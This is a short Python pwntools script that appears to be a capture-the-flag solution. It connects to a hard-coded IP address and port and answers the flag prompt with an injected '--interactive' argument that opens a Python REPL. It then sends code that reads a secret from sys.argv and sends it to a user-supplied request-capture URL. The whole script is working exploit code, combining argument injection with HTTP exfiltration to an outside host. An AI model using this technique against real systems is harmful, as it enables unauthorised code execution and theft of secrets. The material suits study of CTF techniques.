from pwn import *

url = input("Please enter a url to receive the flag (like the one from https://public.requestbin.com): ")

io = connect("34.139.98.117", 6667)

io.sendlineafter("What is the flag? 🔥".encode(), "a -- --interactive".encode()) # --interactive launches a python REPL
sleep(1) # Make sure the REPL loaded
io.sendline(f"import sys, urllib.request; urllib.request.urlopen(f'{url}?{{sys.argv[2]}}').read(); exit()".encode())
